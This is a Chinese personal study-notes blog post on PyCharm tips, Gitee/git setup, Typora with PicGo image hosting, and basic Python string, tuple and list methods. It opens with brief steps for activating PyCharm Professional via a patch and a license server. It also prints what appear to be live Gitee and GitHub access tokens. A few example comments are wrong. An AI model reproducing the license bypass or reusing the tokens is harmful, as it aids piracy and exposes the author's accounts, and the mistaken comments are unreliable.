<p>1、先在专业版上选择试用<br>2、将补丁压缩包拖进pycharm即可<br>3、选择重启<br>4、选择方式（有网和无网）<br>5、选择激活方式，建议license server方式</p>
</li>
<li><p>教程地址：<a href="https://zhile.io/">https://zhile.io/</a></p>
</li>
</ul>
<h4 id="1-1-2-通过ctrl-滚轮调节字体大小设置"><a href="#1-1-2-通过ctrl-滚轮调节字体大小设置" class="headerlink" title="1.1.2 通过ctrl+滚轮调节字体大小设置"></a>1.1.2 通过ctrl+滚轮调节字体大小设置</h4><p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200402191030728.png" alt="image-20200402191030728"></p>
<h4 id="1-1-3-快速定位当前脚本位置"><a href="#1-1-3-快速定位当前脚本位置" class="headerlink" title="1.1.3 快速定位当前脚本位置"></a>1.1.3 快速定位当前脚本位置</h4><p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200402191157264.png" alt="image-20200402191157264"></p>
<h4 id="1-1-4-自动规范代码"><a href="#1-1-4-自动规范代码" class="headerlink" title="1.1.4 自动规范代码"></a>1.1.4 自动规范代码</h4><p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200402191323646.png" alt="image-20200402191323646"></p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200402191436631.png" alt="image-20200402191436631"></p>
<h4 id="1-1-5-pycharm自动加脚本头"><a href="#1-1-5-pycharm自动加脚本头" class="headerlink" title="1.1.5 pycharm自动加脚本头"></a>1.1.5 pycharm自动加脚本头</h4><ul>
<li><p>在pycharm里settings—Editor—Code Style —File and Code Templates — python script </p>
</li>
<li><p>加入：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python# -*- coding:utf-8 -*-</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200404121154283.png" alt="image-20200404121154283"></p>
</li>
</ul>
<h4 id="1-1-6-断点与debug"><a href="#1-1-6-断点与debug" class="headerlink" title="1.1.6 断点与debug"></a>1.1.6 断点与debug</h4><p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200402193019217.png" alt="image-20200402193019217"></p>
<h4 id="1-1-7-快速批量注释"><a href="#1-1-7-快速批量注释" class="headerlink" title="1.1.7 快速批量注释"></a>1.1.7 快速批量注释</h4><ul>
<li>ctrl + / </li>
</ul>
<h4 id="1-1-8-查看对象的其他方法"><a href="#1-1-8-查看对象的其他方法" class="headerlink" title="1.1.8 查看对象的其他方法"></a>1.1.8 查看对象的其他方法</h4><p>查看：鼠标移动到对象上，然后按下 ctr l键 ，鼠标会变成小手，然后点击即可</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200407175518101.png" alt="image-20200407175518101"></p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200407175414410.png" alt="image-20200407175414410"></p>
<h4 id="1-1-9-pycharm修改编码"><a href="#1-1-9-pycharm修改编码" class="headerlink" title="1.1.9 pycharm修改编码"></a>1.1.9 pycharm修改编码</h4><p>要点：修改三处，三处都修改为utf-8</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/20200521175150.png" alt="image-20200521175148122"></p>
<h3 id="1-2-码云的安装和使用"><a href="#1-2-码云的安装和使用" class="headerlink" title="1.2 码云的安装和使用"></a>1.2 码云的安装和使用</h3><h4 id="1-2-1-安装"><a href="#1-2-1-安装" class="headerlink" title="1.2.1 安装"></a>1.2.1 安装</h4><ol>
<li><p>注册码云账号，并且新建仓库</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200403181157434.png" alt="image-20200403181157434"></p>
</li>
</ol>
<p>2、下载git并安装，一直下一步就行。<a href="https://git-scm.com/">https://git-scm.com/</a> </p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200403181250883.png" alt="image-20200403181250883"></p>
<p>3、新建一个专用的文件夹 oldboy_python，然后进入该文件夹，右键—Git Bash Here</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200403182111278.png" alt="image-20200403182111278"></p>
<h4 id="1-2-2-初始化和操作命令"><a href="#1-2-2-初始化和操作命令" class="headerlink" title="1.2.2 初始化和操作命令"></a>1.2.2 初始化和操作命令</h4><p>git初始化：</p>
<ul>
<li><p>如果第一次使用git，没有绑定用户名和邮箱的情况下：</p>
<p>输入命令：</p>
<ul>
<li>git init </li>
<li>git config –global user.name “发飙的登山包”</li>
<li>git config –global user.email “<a href="mailto:&#55;&#x34;&#48;&#x33;&#49;&#x30;&#x33;&#x2b;&#x70;&#121;&#116;&#x68;&#x6f;&#x6e;&#95;&#x72;&#x6f;&#97;&#100;&#x40;&#117;&#115;&#x65;&#114;&#x2e;&#x6e;&#x6f;&#114;&#x65;&#112;&#108;&#x79;&#x2e;&#103;&#x69;&#x74;&#x65;&#x65;&#x2e;&#99;&#x6f;&#109;">&#55;&#x34;&#48;&#x33;&#49;&#x30;&#x33;&#x2b;&#x70;&#121;&#116;&#x68;&#x6f;&#x6e;&#95;&#x72;&#x6f;&#97;&#100;&#x40;&#117;&#115;&#x65;&#114;&#x2e;&#x6e;&#x6f;&#114;&#x65;&#112;&#108;&#x79;&#x2e;&#103;&#x69;&#x74;&#x65;&#x65;&#x2e;&#99;&#x6f;&#109;</a>“</li>
<li>git remote add origin <a href="mailto:&#x67;&#x69;&#116;&#x40;&#103;&#x69;&#x74;&#x65;&#x65;&#46;&#99;&#111;&#109;">&#x67;&#x69;&#116;&#x40;&#103;&#x69;&#x74;&#x65;&#x65;&#46;&#99;&#111;&#109;</a>:python_road/old_boy_python_self_study.git</li>
</ul>
<p>以上就初始化完成</p>
</li>
</ul>
<p>开始操作：</p>
<ul>
<li><p>查看状态（在文件夹下的内容有变动的情况下）</p>
<p>git status</p>
</li>
<li><p>将所有有变化的内容进行收集</p>
<p>git add . </p>
</li>
<li><p>为每次提交填写一个说明</p>
<p>git commit -m “笔记更新”</p>
</li>
<li><p>将内容进行上传</p>
<p>git push origin master</p>
</li>
</ul>
<h3 id="1-3-Typora的使用"><a href="#1-3-Typora的使用" class="headerlink" title="1.3 Typora的使用"></a>1.3 Typora的使用</h3><h4 id="1-3-1-表格行数和列数的自定义编辑"><a href="#1-3-1-表格行数和列数的自定义编辑" class="headerlink" title="1.3.1 表格行数和列数的自定义编辑"></a>1.3.1 表格行数和列数的自定义编辑</h4><p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200416190816603.png" alt="image-20200416190816603"></p>
<h4 id="1-3-2-给本地所有图片换路径"><a href="#1-3-2-给本地所有图片换路径" class="headerlink" title="1.3.2 给本地所有图片换路径"></a>1.3.2 给本地所有图片换路径</h4><p>原理：md文件里的所有图片实际上就是一个路径的指向</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200419133438806.png" alt="image-20200419133438806"></p>
<p>怎么换路径？</p>
<p>ctrl +f   —–选择替换</p>
<p>将原来的路径，替换成新路径，当然前提是原来路径的所有图片转换到新路径里来了</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200419133736591.png" alt="image-20200419133736591"></p>
<h4 id="1-3-3-自动上传图片到码云"><a href="#1-3-3-自动上传图片到码云" class="headerlink" title="1.3.3 自动上传图片到码云"></a>1.3.3 自动上传图片到码云</h4><p>1、安装PicGo软件，推荐使用exe程序：<a href="https://github.com/Molunerfinn/PicGo/releases">https://github.com/Molunerfinn/PicGo/releases</a></p>
<p>2、安装gitee插件（码云上传插件）：</p>
<ul>
<li>前提：安装node.js 插件：<a href="https://nodejs.org/en/">https://nodejs.org/en/</a></li>
</ul>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200419115604002.png" alt="image-20200419115604002"></p>
<p>3、在码云创建仓库</p>
<ul>
<li><p>仓库名称</p>
</li>
<li><p>设置公开</p>
</li>
<li><p>勾选使用Readme文件初始化这个仓库</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200419115916354.png" alt="image-20200419115916354"></p>
</li>
</ul>
<p>4、获取token</p>
<ul>
<li><p>打开码云—-设置—–个人令牌—–新增令牌</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200419120427951.png" alt="image-20200419120427951"></p>
</li>
</ul>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200419120548360.png" alt="image-20200419120548360"></p>
<p>token：722c1dc27e91969847230c2019655e89</p>
<p>github token:      df43a6a0e0a20977b09a55055a077167aaec1f8c</p>
<p>5、配置gitee上传插件</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200419120117787.png" alt="image-20200419120117787"></p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200419132418575.png" alt="image-20200419132418575"></p>
<ul>
<li><p>repo：用户名/仓库名称，比如我自己的仓库leonG7/blogImage，找不到的可以直接复制仓库的url</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200419121014585.png" alt="image-20200419121014585"></p>
</li>
<li><p>branch：分支，这里写上master</p>
</li>
<li><p>token：填入码云的私人令牌</p>
</li>
<li><p>path：路径，表示上传的图片在码云里的途径，区别是在码云的根目录还是其他目录存放</p>
</li>
<li><p>customPath：提交消息，这一项和下一项customURL都不用填。在提交到码云后，会显示提交消息，插件默认提交的是 <code>Upload 图片名 by picGo - 时间</code></p>
</li>
</ul>
<p>6、上传测试</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200419132721087.png" alt="image-20200419132721087"></p>
<p>成功示意图：<img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200419132819317.png" alt="image-20200419132819317"></p>
<p>7、开始上传</p>
<ul>
<li><p>单个上传：每当我们插入一个图片到md里，都会提示是否上传，此时可以选择上传</p>
</li>
<li><p>批量上传文件夹里的文件：不建议使用，容易造成md里的图片混乱</p>
<p>前提1：该md文档里的所有图片都储存在同一个目录里，如果不在，则拷贝到同一个目录</p>
<p>前提2：此时因为我已经通过  格式—-图像—-设置图片根目录   设置好了图片的根目录，并且偏好设置里选择的是上传模式，所以在图片根目录下会生成一个upload文件夹，以后的每一次插入图片，图片的实际存储位置都会跑到这个文件夹来</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200419134022186.png" alt="image-20200419134022186"></p>
</li>
</ul>
<p>易错点：</p>
<ul>
<li><p>第一次配置并上传所有图片时，首先一定要先备份md文件，并且千万不要一键上传，因为一键上传上去的图片因为顺序问题导致md里面的图片混乱</p>
</li>
<li><p>上传图片时，picgo必须要在后台开启着，typora无法自己打开picgo，如果后台没开启picgo，则上传失败</p>
</li>
<li><p>必须在picgo里配置好上传的路径（本地路径），否则提示错误</p>
</li>
<li><p>端口冲突,将端口改为36677端口</p>
</li>
<li><p>没有打开用时间戳重命名图片</p>
</li>
<li><p>没有选择默认图床</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200419133025974.png" alt="image-20200419133025974"></p>
</li>
</ul>
<ul>
<li><p>千万不要将码云里面的图片删除，一旦删除了码云里的图片，那么md文档里的图片都无法显示</p>
</li>
<li><p>怎么一建删除PicGo相册里的残留记录？</p>
<p>PicGo设置——打开配置文件——删除所有内容（里面包括上传记录和配置信息），一旦删除，仅仅只需要重新配置即可，重新配置参考之前的步骤</p>
</li>
</ul>
<p>一键上传图片，图片错位怎么办？</p>
<ul>
<li><p>PicGo配置步骤还是一样的，但是不要在Typora里点击一键上传，md里的图片会错位，首先找到md文件里所有的图片所在的文件夹，然后将该文件夹里的所有图片通过PicGo上传，通过全选—-拖曳方式进行</p>
</li>
<li><p>给md文件里的所有图片地址进行替换</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gitee图片地址样式：![image-<span class="number">20200419133025974</span>](https://gitee.com/python_road/python_img/raw/master/img/image-<span class="number">20200403181250883.</span>png) 只需要将md文件里的图片地址里的   C:\Users\DH\AppData\Roaming\Typora\typora-user-images\   或者 upload/   的路径替换成地址  https://gitee.com/python_road/python_img/raw/master/img/   就行了，全部替换</span><br></pre></td></tr></table></figure></li>
<li><p>替换完成后就可以开启通过时间戳来重命名了，以后每次粘贴图片选择上传就行了</p>
</li>
</ul>
<h1 id="数据类型的方法汇总"><a href="#数据类型的方法汇总" class="headerlink" title="数据类型的方法汇总"></a>数据类型的方法汇总</h1><h2 id="1、整型int"><a href="#1、整型int" class="headerlink" title="1、整型int"></a>1、整型int</h2><p>无方法</p>
<h2 id="2、布尔型"><a href="#2、布尔型" class="headerlink" title="2、布尔型"></a>2、布尔型</h2><p>无方法</p>
<h2 id="3、字符串（str）"><a href="#3、字符串（str）" class="headerlink" title="3、字符串（str）"></a>3、字符串（str）</h2><p>大写：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;oldboy&#x27;</span></span><br><span class="line">b = a.upper()   </span><br><span class="line"><span class="built_in">print</span>(b)  <span class="comment">#结果为：OLDBOY</span></span><br></pre></td></tr></table></figure>

<p>小写：</p>
<ul>
<li>lower：只支持ascii列表里的</li>
<li>casefold:支持除中文外所有语言</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;OLDBOY&#x27;</span></span><br><span class="line">b = a.lower()</span><br><span class="line"><span class="built_in">print</span>(b)  <span class="comment">#结果：oldboy</span></span><br></pre></td></tr></table></figure>

<p>替换：</p>
<ul>
<li>a.replace(‘被替换的字符’,‘替换后的字符’)</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;oldboy&#x27;</span></span><br><span class="line">b = a.replace(<span class="string">&#x27;ld&#x27;</span>,<span class="string">&#x27;**&#x27;</span>)  <span class="comment">#将 ld 替换成 **</span></span><br><span class="line"><span class="built_in">print</span>(b)  <span class="comment">#结果为：o**boy</span></span><br></pre></td></tr></table></figure>

<p>分割：split</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;old-boy&#x27;</span></span><br><span class="line">b = a.split(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(b)  <span class="comment">#结果为：[&#x27;old&#x27;, &#x27;boy&#x27;]</span></span><br></pre></td></tr></table></figure>

<p>去除空格：</p>
<ul>
<li><p>去除左侧空格：lstrip()</p>
</li>
<li><p>去除右侧空格：rstrip()</p>
</li>
<li><p>去除左右空格：strip()</p>
</li>
<li><p>去除指定字符：strip(‘字符’)   ，主要去除\t,\n，因为他们都是由空格组成的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#去除左侧空格</span></span><br><span class="line">a = <span class="string">&#x27;  oldboy  &#x27;</span></span><br><span class="line">b = a.lstrip()</span><br><span class="line"><span class="built_in">print</span>(b)   <span class="comment">#结果为：oldboy  </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#去除右侧空格：</span></span><br><span class="line">a = <span class="string">&#x27;  oldboy  &#x27;</span></span><br><span class="line">b = a.rstrip()</span><br><span class="line"><span class="built_in">print</span>(b)  <span class="comment">#结果为：  oldboy</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#去除左右两侧空格：</span></span><br><span class="line">a = <span class="string">&#x27;  oldboy  &#x27;</span></span><br><span class="line">b = a.strip()</span><br><span class="line"><span class="built_in">print</span>(b)  <span class="comment">#结果为：oldboy</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#去除指定字符</span></span><br><span class="line">a = <span class="string">&#x27;oldboy\n&#x27;</span></span><br><span class="line">b = a.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(b)  <span class="comment">#结果为：oldboy</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<p>更改连接符</p>
<ul>
<li><p>接收参数：必须是字符类型</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;oldboy&#x27;</span></span><br><span class="line">b = <span class="string">&#x27;-&#x27;</span>.join(a)</span><br><span class="line"><span class="built_in">print</span>(b)  <span class="comment">#结果为：o-l-d-b-o-y</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>是否是数字：isdigit</p>
<ul>
<li>如果是小数，则返回False</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;12&#x27;</span></span><br><span class="line">b = a.isdigit()</span><br><span class="line"><span class="built_in">print</span>(b)  <span class="comment">#结果：True</span></span><br></pre></td></tr></table></figure>

<p>判断是否是十进制数字</p>
<ul>
<li><p>要点：是十进制，就返回True，否则False</p>
</li>
<li><p>如果是小数，则返回False</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#例一：</span></span><br><span class="line">a = <span class="string">&#x27;⑿&#x27;</span></span><br><span class="line">b = a.isdecimal()</span><br><span class="line"><span class="built_in">print</span>(b)  <span class="comment">#False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#例二：</span></span><br><span class="line">a = <span class="string">&#x27;12&#x27;</span></span><br><span class="line">b = a.isdecimal()</span><br><span class="line"><span class="built_in">print</span>(b)  <span class="comment">#True</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>查找字符所在的索引位置</p>
<ul>
<li>返回的是索引位置</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;oldboy&#x27;</span></span><br><span class="line">b = a.find(<span class="string">&#x27;l&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(b)  <span class="comment">#结果为：1</span></span><br></pre></td></tr></table></figure>



<p>查找字符出现的次数</p>
<ul>
<li><p>返回的是该字符在字符串中 出现的次数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;oldboy&#x27;</span></span><br><span class="line">b = a.count(<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(b)  <span class="comment">#结果为：2</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>求字符串的长度</p>
<ul>
<li>返回的是字符串里面字符的长度</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;oldboy&#x27;</span></span><br><span class="line">b = <span class="built_in">len</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure>



<p>索引：</p>
<ul>
<li><p>索引从0开始，0代表第一个元素</p>
</li>
<li><p>变量名   + [    +   索引值   +   ]   </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;oldboy&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">2</span>])   <span class="comment">#结果：d</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>切片：</p>
<ul>
<li>a[0:2]：取索引0和1所代表的的值，不包括2</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;oldboy&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a[:])    <span class="comment">#取整个字符串，结果：oldboy</span></span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">1</span>:<span class="number">3</span>])   <span class="comment">#取第二个字符到第三个字符，包括第三个，结果：ld</span></span><br></pre></td></tr></table></figure>



<p>步长：</p>
<ul>
<li><p>不写步长，则默认1</p>
</li>
<li><p>步长为负数，则倒着取值</p>
</li>
<li><p>如果步长是正数，那么切片的起始索引所代表的的值必须要在终止索引所代表的的值的左边</p>
</li>
<li><p>如果步长是负数，那么切片的起始索引值所代表的的值必须要在终止所代表的的值的右边</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;oldboy&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a[::<span class="number">2</span>])  <span class="comment">#步长为2，结果为：odo</span></span><br><span class="line"><span class="built_in">print</span>(a[::-<span class="number">1</span>])   <span class="comment">#步长为负数，则倒着打印：结果为：yobdlo</span></span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">4</span>:<span class="number">0</span>:-<span class="number">1</span>])  <span class="comment">#结果为：obdl</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>格式化：format</p>
<ul>
<li>必须要和大括号{}进行搭配</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;oldboy&#123;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a.<span class="built_in">format</span>(<span class="number">666</span>))  <span class="comment">#oldboy666</span></span><br></pre></td></tr></table></figure>



<p>以指定的编码显示数据</p>
<ul>
<li><p>encode</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;你好呀&#x27;</span></span><br><span class="line">b = a.encode(<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment">#指定以utf-8编码的形式存储到内存中</span></span><br><span class="line"><span class="built_in">print</span>(b)  <span class="comment">#结果为：b&#x27;\xe4\xbd\xa0\xe5\xa5\xbd\xe5\x91\x80&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>以什么开头：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;oldboy&#x27;</span></span><br><span class="line">b = a.startswith(<span class="string">&#x27;ol&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(b)  <span class="comment">#结果True</span></span><br></pre></td></tr></table></figure>

<p>以什么结尾</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;oldboy&#x27;</span></span><br><span class="line">b = a.endswith(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(b)  <span class="comment">#结果为：y</span></span><br></pre></td></tr></table></figure>



<p>for循环遍历元素：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;oldboy&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(i)  </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">结果为：</span></span><br><span class="line"><span class="string">o</span></span><br><span class="line"><span class="string">l</span></span><br><span class="line"><span class="string">d</span></span><br><span class="line"><span class="string">b</span></span><br><span class="line"><span class="string">o</span></span><br><span class="line"><span class="string">y</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>









<h2 id="4、元组"><a href="#4、元组" class="headerlink" title="4、元组"></a>4、元组</h2><p>以指定字符串连接元素：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = (<span class="string">&#x27;oldboy&#x27;</span>,<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">b = <span class="string">&#x27;-&#x27;</span>.join(a)</span><br><span class="line"><span class="built_in">print</span>(b)  <span class="comment">#结果为：oldboy-666</span></span><br></pre></td></tr></table></figure>

<p>for循环遍历元素：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = (<span class="string">&#x27;oldboy&#x27;</span>,<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(b)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">结果为：</span></span><br><span class="line"><span class="string">oldboy</span></span><br><span class="line"><span class="string">666</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>长度：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = (<span class="string">&#x27;oldboy&#x27;</span>,<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">b = <span class="built_in">len</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)  <span class="comment">#结果为：2</span></span><br></pre></td></tr></table></figure>



<p>查看数据在元组中出现的次数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = (<span class="string">&#x27;oldboy&#x27;</span>,<span class="string">&#x27;666&#x27;</span>,<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">b = a.count(<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(b)  <span class="comment">#结果为：2</span></span><br></pre></td></tr></table></figure>



<p>索引：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = (<span class="string">&#x27;oldboy&#x27;</span>,<span class="string">&#x27;666&#x27;</span>,<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">0</span>])  <span class="comment">#结果为：oldboy</span></span><br></pre></td></tr></table></figure>



<p>切片：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = (<span class="string">&#x27;oldboy&#x27;</span>,<span class="string">&#x27;666&#x27;</span>,<span class="string">&#x27;666&#x27;</span>)<span class="built_in">print</span>(a[:])   <span class="comment">#结果为：(&#x27;oldboy&#x27;, &#x27;666&#x27;, &#x27;666&#x27;)</span></span><br></pre></td></tr></table></figure>



<p>步长：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = (<span class="string">&#x27;oldboy&#x27;</span>,<span class="string">&#x27;666&#x27;</span>,<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a[::-<span class="number">1</span>])  <span class="comment">#结果为：(&#x27;666&#x27;, &#x27;666&#x27;, &#x27;oldboy&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">0</span>:<span class="number">3</span>:<span class="number">2</span>])  <span class="comment">#结果为：(&#x27;oldboy&#x27;, &#x27;666&#x27;)</span></span><br></pre></td></tr></table></figure>

















<h2 id="5、列表"><a href="#5、列表" class="headerlink" title="5、列表"></a>5、列表</h2><p>取值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">22</span>]</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">0</span>])  <span class="comment">#结果为：1</span></span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">1</span>])  <span class="comment">#结果为：2</span></span><br></pre></td></tr></table></figure>

<p>增加：</p>
<ul>
<li><p>append():追加，接收的参数作为一个整体加入</p>
</li>
<li><p>extend():扩展，接收的参数里的每个元素都加进来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#append()</span></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">22</span>]</span><br><span class="line">b = [<span class="string">&#x27;狗屎&#x27;</span>,<span class="string">&#x27;666&#x27;</span>]</span><br><span class="line">a.append(b)</span><br><span class="line"><span class="built_in">print</span>(a)    <span class="comment">#结果为：[1,2,11,22,[&#x27;狗屎&#x27;,&#x27;666&#x27;]]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#extend()</span></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">22</span>]</span><br><span class="line">b = [<span class="string">&#x27;狗屎&#x27;</span>,<span class="string">&#x27;666&#x27;</span>]</span><br><span class="line">a.extend(b)</span><br><span class="line"><span class="built_in">print</span>(a)    <span class="comment">#结果为：[1,2,11,22,&#x27;狗屎&#x27;,&#x27;666&#x27;]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<p>删除：</p>
<ul>
<li><p>pop():接收参数为索引值，删除并且返回删除的值</p>
</li>
<li><p>remove():接收参数为具体的数据，如果该数据不存在则报错</p>
</li>
<li><p>clear()：清空列表</p>
</li>
<li><p>del a[0]：根据索引删除</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#del和remove</span></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">22</span>]</span><br><span class="line">b = [<span class="string">&#x27;狗屎&#x27;</span>,<span class="string">&#x27;666&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> a[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(a)    <span class="comment">#结果为：[2, 11, 22]</span></span><br><span class="line">b.remove(<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(b)     <span class="comment">#结果为：[&#x27;狗屎&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pop和clear</span></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">22</span>]</span><br><span class="line">b = [<span class="string">&#x27;狗屎&#x27;</span>,<span class="string">&#x27;666&#x27;</span>]</span><br><span class="line">a.pop(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(a)    <span class="comment">#结果为：[1, 2, 22]</span></span><br><span class="line">b.clear()</span><br><span class="line"><span class="built_in">print</span>(b)     <span class="comment">#结果为：[]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<p>修改：</p>
<ul>
<li><p>索引修改</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">22</span>]</span><br><span class="line">a[<span class="number">3</span>] = <span class="number">99</span></span><br><span class="line"><span class="built_in">print</span>(a)    <span class="comment">#结果为：[1, 2, 11, 99]</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>插入：</p>
<ul>
<li><p>接收参数第一个为索引位置，第二个为需要插入的数据</p>
